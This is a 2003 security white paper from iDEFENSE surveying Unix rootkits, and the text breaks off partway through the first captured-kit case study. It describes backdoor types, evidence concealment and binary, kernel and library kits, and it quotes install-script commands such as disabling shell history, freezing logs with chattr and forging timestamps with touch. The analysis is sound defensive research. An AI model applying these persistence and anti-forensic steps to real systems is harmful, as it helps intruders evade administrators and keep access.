{
    "id": "e597415c-057c-4cf8-99eb-892304798be9",
    "created_at": "2024-08-25T02:03:41.182775Z",
    "updated_at": "2025-03-27T02:16:43.643591Z",
    "deleted_at": null,
    "sha1_hash": "ab94b628493b6e25709ad7a5b4ea780741424be3",
    "title": "An Overview of Unix Rootkits",
    "authors": "",
    "file_creation_date": "2003-02-25T16:18:26Z",
    "file_modification_date": "2003-02-25T16:22:27Z",
    "file_size": 412902,
    "plain_text": "#### iALERT White Paper\n\n# An Overview of Unix Rootkits\n\nBy Anton Chuvakin\n#### iDEFENSE Labs\n\ndi@idefense.com\n\n#### February 2003\n\niDEFENSE Inc.\n14151 Newbrook Drive\n\nSuite 100\n\nChantilly, VA 20151\nMain: 703-961-1070\n\nFax: 703-961-1071\n[http://www.idefense.com](http://www.idefense.com)\n\nCopyright Â© 2003, iDEFENSE Inc.\n\"The Power of Intelligence\" is trademarked by iDEFENSE Inc.\n\niDEFENSE and iALERT are Service Marks of iDEFENSE Inc.\n\n\n**Page 1 of 27** **An Overview of Unix Rootkits**\n\n\n-----\n\n## TABLE OF CONTENTS\n\n\nTABLE OF CONTENTS.................................................................................................... 2\nEXECUTIVE SUMMARY ................................................................................................ 3\nROOTKIT FUNCTIONALITY.......................................................................................... 4\n\nMAINTAIN ACCESS .......................................................................................................... 4\nATTACK OTHER SYSTEMS................................................................................................ 7\nCONCEALING EVIDENCE .................................................................................................. 8\nTYPES OF ROOTKITS ................................................................................................... 10\n\nBINARY ROOTKITS......................................................................................................... 10\nKERNEL ROOTKITS ........................................................................................................ 12\nLIBRARY KITS................................................................................................................ 13\nUSAGE ........................................................................................................................... 14\nFUTURE TRENDS ............................................................................................................ 15\nCASE STUDIES: CAPTURED ROOTKITS................................................................... 16\n\nSA: FIRST GENERATION BINARY KIT............................................................................. 16\nW00TKIT: ONE OF THE MANY CHILDREN OF T0RN ........................................................ 18\nRK: HIDDEN BUT NOT ENOUGH ..................................................................................... 22\nCONCLUSION................................................................................................................. 24\nEND NOTES .................................................................................................................... 25\nABOUT THE AUTHOR .................................................................................................. 26\nACKNOWLEDGEMENTS.............................................................................................. 27\n\n**Page 2 of 27** **An Overview of Unix Rootkits**\n\n\n-----\n\n## EXECUTIVE SUMMARY\n\n\nRootkits, as we know them now, came into being sometime in the mid 1990s. At that\ntime, Sun operating system Unix system administrators started seeing strange server\nbehavior, missing disk space, CPU cycles and network connections that strangely did not\nshow up in command netstat.\n\nThe age of rootkits had begun. While rootkits were born in the mid-1990s, many tools\n(such as log file cleaners) that later become inherent parts of rootkits were known as long\nago as 1989 and even earlier in the underground. Rootkits (further referenced as kits) are\nautomated software packages to setup and maintain an environment on a compromised\nmachine. In this white paper, we review the main areas of rootkit functionality.\n\nBy implementation technology, three main classes of rootkits are available today: binary\nkits, kernel kits and library kits. The first class achieves its goal by replacing certain\nsystem files with their Trojan counterparts. The second uses kernel components (also\ncalled modules) or Trojans, and the third employs system library Trojans. Rootkits found\nin the wild (such as captured on honeypots), often combine trojaned binaries with higher\n\"security\" provided by the kernel and library components.\n\nJust as an overview, the timeline below shows a brief history of rootkits (note that all\ndates below are the dates when information became publicly available and software\nmight have been available much earlier in the underground):\n\nFrom log cleaners to live kernel patching:\n\n    - 1989: First log cleaners found on hacked systems\n\n    - 1994: Early SunOS kits detected\n\n    - 1996: First Linux rootkits publicly appear\n\n    - 1997: LKM Trojans proposed in \"Phrack\"\n\n    - 1998: Non-LKM kernel patching proposed by Silvio Cesare\n\n    - 1999: Adore LKM kit released by TESO\n\n    - 2000: T0rnkit v8 libproc library Trojan released\n\n    - 2001: KIS Trojan and SucKit released\n\n    - 2002: Sniffer backdoors start to show up in kits\n\n**Page 3 of 27** **An Overview of Unix Rootkits**\n\n\n-----\n\n## ROOTKIT FUNCTIONALITY\n\n\nOur research indicates that rootkit functionality can be categorized into following groups:\n\n    - Maintain access\n\n    - Attack other systems\n\n    - Destroy evidence\n\nLet's analyze those areas in more detail.\n\n#### Maintain Access\n\nMaintaining access is typically associated with backdoors, both local and remote. First,\nconsider remote backdoors, i.e., hidden remote access applications. The methods are\nlisted below. The list follows the ascending level of stealth that each backdoor provides.\nNote that remote access methods that will only work in local LAN are not considered (no\ndatalink-layer or second layer communication).\n\n1. Telnet or shell on a TCP port: An attacker may simply connect to a system via\ntelnet or old inetd-spawned shell backdoor (a shell bound to a high port on a\nsystem). This first option is not covert at all, allows for easy detection, and is only\nprovided for reference. The high port shell will allow one to hide from only the\nmost entry-level Unix administrators (not yet knowing the command netstat), as\nthe connection will not leave a record in system logs unlike the stock telnet. The\ninetd.conf shell backdoor dates back to the 1980s and likely even earlier. It can be\neasily spotted by looking for extraneous entries in /etc/inetd.conf. Similar access\ncan be realized by trojaning any of the listening daemons, such as telnet, sshd,\nftpd, sendmail, named, httpd, tcpd, finger, inetd or many others available on Unix,\nmaking it provide a shell on a certain port upon request.[1]\n\n2. Secure shell (SSH), regular or trojaned on high port: ssh remote login software\nis a backdoor tool of choice for many amateur attackers. Deploying a second ssh\ndaemon running on a high port (such as 812 or 1056 TCP), on a compromised\nmachine, is a modus operandi of many a script kiddy.[2] This provides several\nadvantages over using telnet, as communication is encrypted and suspicious\ncommands cannot be picked by the network IDS systems. Custom SSH daemons\nalso will not leave evidence in log files upon connecting. Both SSH and telnet\nwill show up in the netstat command, provided that it is not trojaned by the kit to\nmiss the offending connections. This access technique becomes somewhat better\nunder the cover of Trojan binaries or kernel rootkit that hides the connection from\nthe admin. The listening TCP ports give it away if the server is port scanned from\noutside using tools such as nmap.\n\n3. CGI shell: A rootkit may deploy a hostile CGI script in the web server\n\n**Page 4 of 27** **An Overview of Unix Rootkits**\n\n\n-----\n\ndirectory. It is often considered a backdoor of \"last resort\" in case a system\nadministrator has found the kit and erased its main directory. The CGI script will\nexecute the user-defined commands (with the privileges of the user \"nobody\" or\n\"httpd\") and show the output in browser. Local attacks will have to be used to get\n\"root\". This does not open any new ports, but just piggybacks on the existing web\nserver connection.\n\n4. UDP listener: UDP services are harder to port scan than TCP and are usually\nless likely to be sought and discovered. If a backdoor listens on the UDP port, it is\nless likely that running various system commands or port scanning will discover\nit. Communication protocols must be designed for such connections, as no\nstandard remote access protocol occurs over UDP. Encrypting the communication\nwill protect it from network IDS.\n\n5. Reverse shell/telnet: A backdoor that opens a connection from a target to an\nattacker's machine is better than a regular connection (from attacker to a victim),\nas the target should not have any new open ports and can be firewalled (such as\nby personal firewall or host-based ACL protection) to prevent inbound\nconnections. The hacker machine should be running something like \"netcat\" (nc)\nto listen for inbound connections. The connection can also be encrypted (e.g., by\ncryptcat or stunnel SSL wrapper), and thus shielded from network IDS. However,\nmany people will find it at least unusual if their servers start to initiate\nconnections to some outside machines. Moreover, some outbound connections\ncan be safely blocked on the border firewall en-masse (e.g., block all outbound\nfrom all public DMZ servers), thus foiling the reverse shell.\n\n6. ICMP \"telnet\": One can tunnel everything over everything else, or so they say,\nand the \"ICMP telnet\" (such as implemented by the classic Loki tool) is a prime\nexample. ICMP control messages such as Echo Request and Echo Reply can be\nmade to carry payloads such as command line sessions. Many types of ICMP\nmessages are allowed through the firewall for network performance reasons. Such\nbackdoors will not be seen in netstat and cannot be uncovered by port scanning\nthe target machine. However, network IDS systems may pick up the unusual\npatterns in ICMP communication caused by the existing publicly available ICMP\nbackdoors.\n\n7. Reverse tunneled shell: This shell helps with blocked outbound connections. In\nmost environments, web browsing (access to outside machines on port 80 TCP) is\nallowed and often unrestricted. Remote HTTP shell will imitate a connection from\na browser (inside the protected perimeter) to the web server (outside). The\nconnection itself will be fully compliant with HTTP protocol used for browsing\nand can even pass through HTTP proxies (such as Squid), authenticated proxies,\nand proxy firewalls (provided that access credentials are available). Software that\ncan interpret the \"HTTP-encoded\" command session will act as the web server.\nSuch a backdoor is extremely unlikely to be picked up by any network IDS. The\nbackdoor engine can be activated by a \"magic\" packet or by a timer for higher\n\n**Page 5 of 27** **An Overview of Unix Rootkits**\n\n\n-----\n\nstealth. Similar to the previous case, this technique is not optimal for backdoor\naccess to DMZ machines, where outbound connections can be prevented.\n\n8. \"Magic\" packet-activated backdoor: This backdoor is a mix between reverse\nshells and regular direct connect backdoors. The backdoor opens a port, executes\na single command, or initiates a session from the target only upon receiving a\nspecific packet, such as TCP with a specific sequence number of other\ninconspicuous parameter set.\n\n9. No-listener (sniffer-based) backdoor: This method of hidden communication\nprovides a high degree of stealth and includes deception capabilities. In this case,\nthe backdoor does not open a port but starts sniffing network traffic instead. Upon\nreceiving a specific packet (not aimed at the machine with a backdoor installed\nbut visible to it, i.e., located on the same local area network), it executes an action\nand sends a response. The response is also sent using a \"spoofed\" (i.e., faked)\nsource IP address so that the communication cannot be traced back to a target.\nLimited tracing is possible by observing the layer two (i.e., MAC or network card\nhardware) addresses, but only by an observer in the same LAN as the victim.\nThese backdoors are just starting to pop up in rootkits.\n\n10. Covert channel backdoor: A full-blown covert channel (in the sense defined in\nthe Department of Defense \"rainbow series\" of books) can be designed to be\nproved undetectable.[3] If one is to design its own signal system and then overlay it\nover the otherwise innocuous network protocol, it will probably never be detected\nby existing security software. The number of factors that can be varied and the\nnumber of arbitrary fields within current network and application layer protocols\nis too high to account. Just imagine: The TCP initial sequence number is not quite\nrandom but carries a pattern. What if the web server slightly changes the\nformatting of the web page to send a byte or two? Possibilities are endless,\nespecially if a low-bandwidth channel will suffice. Surveyed rootkits did not\nutilize this technology.\n\nLocal access maintenance is assured by rootkits by providing trojaned tools that yield\nroot access. Many standard Unix tools installed SUID root are repackaged by attackers to\nprovide \"root on demand.\" Ping, xterm and many of the network daemons might be used\nfor that purpose. Some kernel rootkits simply give root to a specified user name, not\nlisted as having UID 0 in /etc/password.\n\nWhile rootkits always require root for installation and give its owner root access on\ndemand, many of them implement an \"offense in depth\" by providing many different\nbackdoors and Trojans to access the system and escalate privileges. In case the main\nbackdoor, such as a trojaned SSH, is found and killed, several other tricks might allow an\nattacker to get back. Rootkits might create additional root and \"non-root\" accounts that\ncan be used to get back to a system. Local privilege escalation is provided by modified\nSUID binaries. Trojaned /bin/login is another popular choice.\n\n**Page 6 of 27** **An Overview of Unix Rootkits**\n\n\n-----\n\nA copy of SUID root /bin/bash, stashed in an obscure location, will provide an easy\nbackup way to get root (on a system with no periodic integrity checking and SUID\nsearching). As discussed above, a kernel Trojan can be utilized to give root to specific\nusers by remapping a setuid() kernel call. Even simpler, the system might be artificially\n\"weakened\" so that exploiting a local application becomes easier. A change in one\nconfiguration file can go a long way toward opening a hole for the intruder.\n\nSecuring the system against competing attackers can also be considered part of\n\"maintaining access,\" as it prevents other unauthorized users from abusing the system.\nSeveral surveyed rootkits do a thorough job of closing holes, hardening and patching the\nsystem. Most rootkits also include the functionality to clean the system of previously\ninstalled kits and distributed DoS zombies.\n\n#### Attack Other Systems\n\nAttacks tools to attack other systems and expand the \"captured territory\" appeared in\nLinux rootkits toward the end of the 1990s. iDEFENSE classifies the attack tools\nincluded in rootkits into the following categories:\n\n    - Local attack tools\n\n    - Remote attack tools\n\n    - DoS tools\n\nLocal attacks are mostly conducted to recapture root taken by the vigilant system\nadministrators and to obtain access to machines on the same LAN.\n\nMost rootkits contain a basic password sniffer (such as linsniff for Linux) that will wreak\nhavoc on a network where clear text protocols are in use. Examples of such protocols\ninclude POP3, IMAP, telnet, ftp and many others. All the authentication credentials\n(usernames and passwords) from those sessions will be captured and potentially abused\nby the intruder. Additionally, attackers might be able to read e-mails sent via simple mail\ntransport protocol (SMTP), as it is also a plaintext protocol.\n\nSniffer software works by placing a machine's network interface in promiscuous mode so\nthat all packets passing through the wire are seen by the system and analyzed by the\nsniffer software for the presence of password authentication, such as strings \"login:,\"\n\"password:\" (to catch leading capital P as well as small p), etc. The network interface\nconfiguration change also provides a way to detect sniffers locally by the promiscuous\nflag on the interface (in Linux, shown by the command /sbin/ifconfig). Consequently,\nrootkits often Trojan the command ifconfig to hide the flag.\n\nThe kit usually also contains a tool to parse the sniffer output looking for\npassword/username pairs. A tool may be able to e-mail the captured data, despite the\ndiscovery of a sniffer. Part of the captured data will be safely in the hands of attackers.\nMore sophisticated sniffers (such as dsniff by Dug Song, capable of sniffing on switched\nLANs) are available but are not seen as part of rootkits.\n\n**Page 7 of 27** **An Overview of Unix Rootkits**\n\n\n-----\n\nAn unusual local attack tool, called a \"SSH syscall sniffer,\" was found in one of the\nrootkits captured on the honeynet. It allows the attacker to eavesdrop on local users\nconnecting to remote SSH servers and on remote users connecting to a local SSH server.\nThe software worked by intercepting system calls, such as read() and write(), that contain\nusernames and passwords for establishing the SSH sessions.\n\nLocal attack tools also cover various password-cracking utilities, handy for tightening the\nhold on the system by taking over more and more accounts of legitimate users. Remote\nattack tools include various scanners and autorooters.[4] One of the commonly used\nautorooters (that makes a lot of noise at most network perimeters at the time of this\nreport) is AWU, the WU-FTPD mass exploitation tool. The logic of the software is very\nsimple: Get a class of IP addresses (such as a B-class), scan it for the presence of\nlistening FTP daemons, then run the banner grab within the results of the first run to\nidentify vulnerable WU-FTPD installs.[5] On the third run, exploit the machines and report\non success.\n\nDoS tools are in a special category. Most rootkits captured on our honeynet contained at\nleast one or more flood tools, ranging from a dated but still lethal synk TCP SYN packet\nflooder to a modern multi-mode spoofed flooders that can use older TCP SYN, ICMP,\nUDP, TCP ACK floods and modern reflexive DoS attacks, such as spoofed domain name\nsystem (DNS) response floods. Attackers use the tools without any second thoughts on\ntheir enemies and during Internet relay chat channel takeovers (\"IRC wars\").\n\n#### Concealing Evidence\n\nThe third crucial element of rootkit functionality is evidence elimination. Such activity\nconsists of removing the evidence of pre-attack activity and preventing the generation of\nnew evidence.\n\nRemoving existing evidence boils down to sanitizing various log files, audit records\n(such as BSDstyle process accounting), application logs and shell histories. A plethora of\nwell publicized tools exit for this purpose. Most commonly used methods include file\nremoval (with standard Unix tools) and editing. None of the surveyed rootkits used any\nreliable or secure data removal tools.\n\nKilling off and/or modifying the syslog daemon most commonly accomplish prevention\nof an audit. Most rootkit installation scripts perform that action automatically and some\nalso notify the user of the found traces of remote logging (@loghost-type entries in\n/etc/syslog.conf). Other operations include preventing the creation of shell history files\nthat record all the interactive session commands for remote and local users.\n\nHiding the evidence of breaking is the area where kernel-level or Loadable Kernel\nModule (LKM) kits excel. Unlike regular binary kits that replace system executable files,\nLKM kits (publicly available for Linux, Free/OpenBSD and Solaris) hook into the system\nkernel and replace (remap) or modify (intercept) some of the kernel calls used to interface\nbetween user-space components, such as file system tools, and core kernel components.\nIn this case, the very core of the operating system becomes untrusted. Consequently, all\n\n**Page 8 of 27** **An Overview of Unix Rootkits**\n\n\n-----\n\nsystem components that use the corrupted kernel call can and will lie to the user and\nwhatever security software installed. A rootkit will typically have a special configuration\nfile or have the hardcoded filenames to be hidden.\n\nIn most cases, the rootkit will hide:\n\n    - Its own files\n\n    - Other attackers files (identified by name or location)\n\n    - Attacker's processes (such as sniffers, backdoor daemons and password\ncrackers)\n\n    - Specific network connection to and from the compromised machine identified\nby address or protocol (such as, hide all IRC)\n\n**Page 9 of 27** **An Overview of Unix Rootkits**\n\n\n-----\n\n## TYPES OF ROOTKITS\n\n\nThree main classes of rootkits are available today: binary kits, kernel kits and library kits.\nNote, however, rootkits found in the wild often combine trojaned binaries with higher\n\"security\" provided by the kernel and library components.\n\n#### Binary Rootkits\n\nThe first rootkits seen in the wild used to replace critical system binaries, such as\n/bin/login and network daemons. Attackers used these rootkits to accomplish several\ngoals, such as remote access, local access and evidence hiding. The first rootkits were\nsimply tar archives of several popular system binaries (that are likely to be run by system\nadmin of the compromised machines to check on system health) and several other\nsupport applications, such as log cleaners.[6]\n\nThe executable files were trojaned to perform an action conducive for an attacker, such as\nhide malicious processes. The tar archive also contained an installation script to copy the\nbinaries in the right places (usually over the existing system files) and perform other\nactions, such as closing the hole used to attack the system. Such actions are described in\ndetail further below. The binary files were usually precompiled for a particular\narchitecture (such as Linux on i386 Intel or Sparc Solaris), leaving it up to the user to find\nand utilize the correct kit for each compromised system.\n\nLet us briefly analyze how those binary kits accomplish the tasks of hiding and access.\nAn attacker deploys a kit after breaking-in via an included installation script. The script\nplaces the binaries over the original versions and (sometimes) saves the old copies. Here\nis a (somewhat) complete list of binaries that are often replaced (based on the list from\nwebsite at chkrootkit.org):\n\n- amd - ftpd - netstat\n\n- asp - fusers - ntpd\n\n- basename - gpm - passwd\n\n- biff - grep - pidof\n\n- chfn - hdparm - pop2d\n\n- chsh - identd - pop3d\n\n- cron - ifconfig - ps\n\n- date - inetd - pstree\n\n- dirname - killall - rexed\n\n- du - login - rlogind\n\n- echo - ls - rpcinfo\n\n- egrep - lsof - rshd\n\n- env - mail - sendmail\n\n- find - mingetty - slogin\n\n- fingerd - named - sshd\n\n**Page 10 of 27** **An Overview of Unix Rootkits**\n\n\n-----\n\n- wted\n\n- xinetd\n\n- z2\n\n\n\n- su\n\n- syslogd\n\n- tar\n\n- tcpd\n\n- telnetd\n\n\n\n- timed\n\n- top\n\n- traceroute\n\n- w\n\n- write\n\n\nThe above trojaned binaries are used for the following areas of rootkit functionality:\n\n    - Provide remote access. The binary /bin/login or trojaned network daemons\n(identd, rlogind, rshd, sendmail, sshd, telnetd and many others) may contain a\nmagic password (such as in the form of $DISPLAY or $TERM environment\nvariable commonly passed by the client to the server) that will provide a\nprivileged access to an attacker. Trojaning the network access control application\ntcpd (part of TCP Wrappers package) will make it \"overlook\" certain connection\nattempts or even make them launch a root shell for a connection from a specific\nIP address.\n\n    - Provide local access. A kit may modify the binary /bin/login or many of the\nnormally SUID binaries (/bin/ping, /usr/sbin/traceroute, /bin/su and great many\nothers) to provide \"root\" privileges to specified users or to those possessing a\n\"magic\" password or command-line switch. An attacker may use a modified cron\ndaemon to execute processes as desired.\n\n    - Provide process hiding. The trojaned binary /bin/ps will hide processes from\ncasual viewing by the system admin. A modified syslogd daemon will hide the\nprocesses from ever logging any messages to system logs and remote log servers.\n\n    - Provide connection hiding. The binary /bin/netstat (a standard Unix command to\nview network connections) Trojan will \"help\" in this regard.\n\n    - Provide file hiding. A kit may trojan a plethora of file-browsing tools, such as ls,\ndir and even cat, to hide certain file from detection. Some rootkits contain the\nglobal configuration file that lists what connections, files and processes should be\nhidden using the regular expressions (i.e., patterns) syntax.\n\n    - Provide user activity hiding. If a system admin logs in to a compromised system,\nthe like of w, who and finger trojaned binaries will make sure that attacker's user\nentry is not displayed.\n\nOther binary Trojans will hide evidence of running network sniffers (via ifconfig\ncommand Trojan).\n\nWhen the kit is installed, its own tools deploy in some hidden directory. Hidden here\nrefers to \"not commonly looked at by administrators\" and not to any special hidden\nproperties. Integrity checking tools could easily find the directory, provided the tools\nwere installed before the break-in. Note that the system command ls will likely be\ntrojaned to not show this directory by the attacker, just for the sake of \"safety.\"\n\n**Page 11 of 27** **An Overview of Unix Rootkits**\n\n\n-----\n\nHere are some of the common locations to install rootkit files:\n\n    - /dev/.hdd\n\n     - /dev/.lib\n\n     - /etc/\".. \"\n\n     - /etc/...\n\n    - /etc/rc.d/arch/alpha/lib/.lib\n\n     - /etc/rc.d/rsha\n\n     - /usr/info/.t0rn\n\n     - /usr/lib/.egcs\n\n    - /usr/src/.poop\n\n     - /usr/src/.puta\n\n    - /usr/src/linux/arch/alpha/lib/.lib/.1proc\n\nThe third entry refers to a dot-dot-space directory name, a classic choice to deploy rootkit\nfiles.\n\nSome invisible special characters are also often used in directory names to make their\ndiscovery and deletion harder. When installing the Trojans, rootkit installation scripts\noften contain additional tools to adjust the timestamp and sizes of the Trojans to match\nthe original binaries. Even a simple touch command can be used to get the timestamp\nfrom one file and assign it to another (touch -r oldfile trojanfile).\n\n#### Kernel Rootkits\n\nKernel-level rootkits first came into being as malicious kernel modules. It is unknown\nwhen the first Loadable Kernel Module (LKM) kit was coded in the underground, but it\nclearly happened much earlier than was made public in a BugTraq post by Runar Jensen\nin October 1997 (heroin.c LKM Trojan for Linux). Unlike regular kits that replace\nsystem files, LKM kits (now publicly available for Linux, Free/OpenBSD and Solaris)\nhook into the system kernel and modify some of the system calls. Most Unix operating\nsystems separate between the kernel-mode and user-mode. For example, the applications\nrun in user-mode while most hardware device interaction happens in kernel-mode.\n\nIf an application needs an access to a certain hardware piece, it requests the access via a\nsystem call. For example, to read a file, a read() system call is used. The application\nexecutes a system call and a kernel provides an access to a file on a disk. Each operating\nsystem has a slightly different list of system calls, often found in\n/usr/include/sys/syscall.h or /usr/include/syscall.h. The code for the calls is part of the\nkernel. The loadable kernel module, which runs in kernel-mode, has a capability to\nmodify this code and thus to change the functionality of the call. For example, the open()\ncall that used to mean \"get to disk and open a file from this location\" might become a\ncommand to get a disk and open the file from this location unless its name is \"rootkit.\"\nThe same trick can be played with many system calls, leading to a compromised system.\n\nThe very core of the operating system then becomes untrusted. Consequently, all system\n\n**Page 12 of 27** **An Overview of Unix Rootkits**\n\n\n-----\n\ncomponents that use the corrupted kernel call can and will lie to the user and whatever\nsecurity software installed. Commands such as ls execute a system call to read directory\nentries and provide them for a user. The command will report any incorrect information\nsimply because it will be given the incorrect data by the kernel.\n\nMore details on the implementation of malicious LKM rootkits are available at\n[http://rr.sans.org/threats/rootkits.php and http://rr.sans.org/linux/kernel_mods.php. LKM](http://rr.sans.org/threats/rootkits.php)\nkits take the art of hiding on the next level. At the very least, they include file, process,\nconnection and other kernel module hiding capabilities. More advanced malicious LKMs\nattempt to combat detection attempts by the known anti-LKM-rootkit tools and provide\nthe users with additional functionalities, such as root on demand or in-kernel network\nbackdoors.\n\nAdministrators may defeat most LKM kits by simply disabling the loading of modules\nwithin the Unix/Linux kernel. This is usually a compile-time option for open-source Unix\nvariants. Sun Microsystems Inc.'s Solaris operating systems allow it as well. Recently, it\nwas discovered (in the seminal paper of Silvio Cesare titled Runtime Kernel Patching)\nthat loadable modules are not required for intruding upon the Unix kernel. Instead, one\ncan directly modify the memory image (usually in /dev/mem) to affect the system call\ntable or other parts of the running kernel.\n\nSeveral kits have since turned this research advance into production code. SucKit is a\nuser-friendly package that installs in the kernel and allows covert remote login, without a\nneed to insert any modules and with no usermod components. The technique, invented by\nSilvio Cesare, works for both 2.2 and 2.4 kernels.\n\n#### Library Kits\n\nLibrary Trojan kits, of which T0rn 8 is the most famous representative, use somewhat\ndifferent methods to elude detection. For example, t0rn kit uses a special system library\n(called libproc.a) that replaces a standard system library used for relaying the process\ninformation from the kernelspace (via /proc file system) to user space utilities such as\n/bin/ps and top. Having the trojaned library allows one not to modify the binaries\nthemselves as they will use the data \"sanitized\" by the libproc.a Trojan. For example,\nsuch a library can filter certain process names from being seen. Looking directly at /proc\nwill reveal the ruse.\n\nIt is also reasonably straightforward to modify the glibc/libc main system library to\nswitch the data before it is sent to a kernel, thus duplicating the functionality of an LKM\nrootkit without going into the kernel space. This action can be called a user-space\nequivalent of kernel module-based redirection. An application linked with the library,\nsuch as most default applications on a Linux system, will report false data. However,\nstatically linked applications will avoid this ruse.\n\nRootkits are rumored to use this technology for process and file hiding.\n\nAnother sophisticated rootkit was found to use a different trick involving system\n\n**Page 13 of 27** **An Overview of Unix Rootkits**\n\n\n-----\n\nlibraries. The kit added an entry to /etc/ld.so.preload and provided its own library that\nredirects some of the standard library calls. Its position in /etc/ld.so.preload assures that it\nwill load before other system libraries, thus making sure that its \"custom\" calls will\nexecute in place of regular ones.\n\nUnix tools such as ltrace, strace and truss can be used to trace library calls and\nsystem/kernel calls.\n\n#### Usage\n\nHere is how attackers use the rootkits on the compromised systems. After gaining access,\nthe attacker will download the kit from his site or a \"dead drop\" box, unpack it and run\nthe installation script.\n\nHere is the typical rootkit usage strategy as used by attackers in a honeynet:\n\n1. Find the vulnerable host, usually via an automated scanner, autorooter or a\nprebuilt database of vulnerable hosts.[7]\n2. Exploit the host.\n3. Download a rootkit. Sometimes this step is performed immediately after\nexploitation by the same tool. In this case, the attacker might leave the autorooter\nrunning overnight and will have a list of compromised and backdoored machines\nin the morning.\n4. Deploy the kit via an installation script. Note that the installation shell script\nperforms many actions.\n\nLet us quickly look though the typical rootkit installation script, such as the one featured\n[in an analysis paper at http://www.linuxsecurity.com/feature_stories/ftp-analysis-](http://www.linuxsecurity.com/feature_stories/ftp-analysis-)\npart1.html.\n\n1. Disable the shell history (via unset HISTFILE; export HISTFILE=/dev/null).\n2. Setup the directory structure for rootkit (e.g., /usr/info/.1).\n3. Unpack the components.\n4. Kill the syslog daemon and freeze the system logs (via chattr +i).\n5. Deploy and start the backdoor sshd daemon under the innocuous-sounding\nname. The daemon uses port 1100 TCP.\n6. Unpack, built and deploy the LKM to make sure it runs on every system boot\n(adore-0.42). LKM hides the kit directories, the running sshd process and Internet\nrelay chat connections\n7. Modify system startup file to launch the sshd and a sniffer on system boot.\n8. Deploy some additional tools (DoS attack tools).\n9. Unlock the log files locked by chattr above.\n10.Remove the evidence such as rootkit package and other files.\n\nAfter deploying the kit, the attacker is able to connect to his backdoor on TCP port 1100\nand use the system without being seen.\n\n**Page 14 of 27** **An Overview of Unix Rootkits**\n\n\n-----\n\n#### Future Trends\n\nLets cast a cursory look at future trends that are emerging in the rootkit technologies.\nHere is a list of some trends noticed in our research.\n\n    - Better HIDS protection. Research exists on circumventing checksum\nverification, but few rootkits implement any effective anti-HIDS tricks. As more\npeople deploy host-protection measures (Tripwire is now included by default in\nseveral Linux distributions), more rootkits will automatically attempt to avoid or\nfight HIDS. Note simple integrity checkers will not detect most LKM kits (such\nas adore or knark), but more advanced solutions (such as Tripwire) will catch\nthem.\n\n    - Custom kernel hiding and non-LKM kernel attack. While SucKit has been\nspotted in several Linux attacks, more kits that use the runtime kernel patching are\ncertain to surface, especially for custom intrusion.\n\n    - Better LKMs hide from detection . An \"armor/projectile battle\" rages between\nthe malicious LKM developers. As more tools to discover them are written, more\nkits will include the technology to avoid the defensive measure. The KIS kit, for\nexample, attempts to evade the StMichael LKM detection module.\n\n    - Covert channeling and passive backdoors. Passive backdoors are likely to\nbecome more common in rootkits due to their excellent stealth properties. Some\nattacks captured by the honeynet projects used spoofing for bidirectional\ncommunication. Moreover, distributed DoS components also talk using spoofed\nIP packets.\n\n    - More application-level backdoors. As more emphasis is placed on application\nsecurity, more rootkits will likely use hiding within applications to accomplish\ntheir goals.\n\nMalicious CGI scripts are deployed by rootkits even now, thus more application-level\nbackdoors are sure to follow.\n\n**Page 15 of 27** **An Overview of Unix Rootkits**\n\n\n-----\n\n## CASE STUDIES: CAPTURED ROOTKITS\n\n\niDEFENSE will now analyze three rootkits captured on compromised Linux machines.\nOne is a pure binary kit, which only replaces executable files; one is a remote child of the\nt0rn v.8 kit, and thus uses a malicious library to hide processes; and the third is an Adorebased Loadable Kernel Module (LKM) kit, albeit translated in Romanian.\n\n#### Sa: First Generation Binary Kit\n\nOn Sunday, May 5, 2002, the honeypot running at RedHat Linux 7.1 was hit by the WUFTPD exploit, which yields remote root access (See CERT Advisory CA-2001-33,\n[Multiple Vulnerabilities in WU-FTPD at http://www.cert.org/advisories/CA-2001-](http://www.cert.org/advisories/CA-2001-)\n33.html). The attacker has downloaded and deployed the binary-only rootkit from his\npersonal website.\n\nThe kit appears an early kit, slightly modified for modern Linux distributions. Here is the\nfile composition for the kit:\n\n-rwxr-xr-x 1 anton anton 4620 Aug 8 2000 becys.cgi\n-rwxr-xr-x 1 anton anton 76 Nov 11 2000 hdparm\n-rwxr-xr-x 1 anton anton 19840 Sep 25 1983 ifconfig\n-rwx------ 1 anton anton 1954 Feb 10 2002 install\n-rwx------ 1 anton anton 7165 Sep 25 1983 linsniffer\n-rwx------ 1 anton anton 75 Sep 25 1983 logclear\n-rwxr-xr-x 1 anton anton 35300 Sep 25 1983 netstat\n-rwxr-xr-x 1 anton anton 33280 Sep 25 1983 ps\n-rw-r--r-- 1 anton anton 704 Feb 5 2002 s\n-rwxr-xr-x 1 anton anton 4060 Sep 25 1983 sense\n-rwx------ 1 anton anton 8268 Sep 25 1983 sl2\n-rwxr-xr-x 1 anton anton 686535 Dec 2 2000 sshdu\n-rw------- 1 anton anton 541 Sep 25 1983 ssh_host_key\n-rw------- 1 anton anton 512 Sep 25 1983 ssh_random_seed\n-rw------- 1 anton anton 0 Dec 16 15:16 tcp.log\n-rwxr-xr-x 1 anton anton 53588 Sep 25 1983 top\n\nLet us examine how the rootkit components are installed on the victim machine. This\nexamination also provides a practical example of rootkit functionality and technologies.\nDuring the kit installation, the installation script performs the following steps (see install\nfile above). The script runs after the rootkit is copied and unpacked:\n\n1. The installation begins with the standard steps to prevent the audit trail\nformation. This kit does not use any sophisticated steps to hide its presence or the\ninstallation. It only ensures that the shell history of the current session is not\nproduced (via the command unset HISTFILE).\n\n**Page 16 of 27** **An Overview of Unix Rootkits**\n\n\n-----\n\n2. Second, the kit erases the original binary files and deploys the Trojans (to the\nfiles at /sbin/ifconfig, /bin/netstat, /bin/ps and /usr/bin/top). These applications\nallow the attacker to hide its processes, network connections and the promiscuous\nflag on the network interface (due to running the sniffer) from the casual snooping\nby the system administrator.\n\n3. The rootkit installation script then builds a configuration file used by the above\nTrojans to hide themselves and other hacker applications. The kit creates the file\nin the directory /dev/dsx via the following:\n\necho \"3 sl2\" >>/dev/dsx\necho \"3 sshdu\" >>/dev/dsx\necho \"3 linsniffer\" >>/dev/dsx\necho \"3 smurf\" >>/dev/dsx\necho \"3 slice\" >>/dev/dsx\necho \"3 mech\" >>/dev/dsx\n...\n\n4. The rootkit builds another configuration file to hide network connections. The\nkit lists his favorite IP address classes and ports. Notice Internet relay chat port\n6667 listed.\n\necho \"1 193.231.139\" >>/dev/caca\necho \"1 213.154.137\" >>/dev/caca\necho \"1 193.254.34\" >>/dev/caca\necho \"3 6667\" >>/dev/caca\necho \"3 3666\" >>/dev/caca\necho \"3 31221\" >>/dev/caca\n...\n\n5. The install script creates a home directory for other kit components. 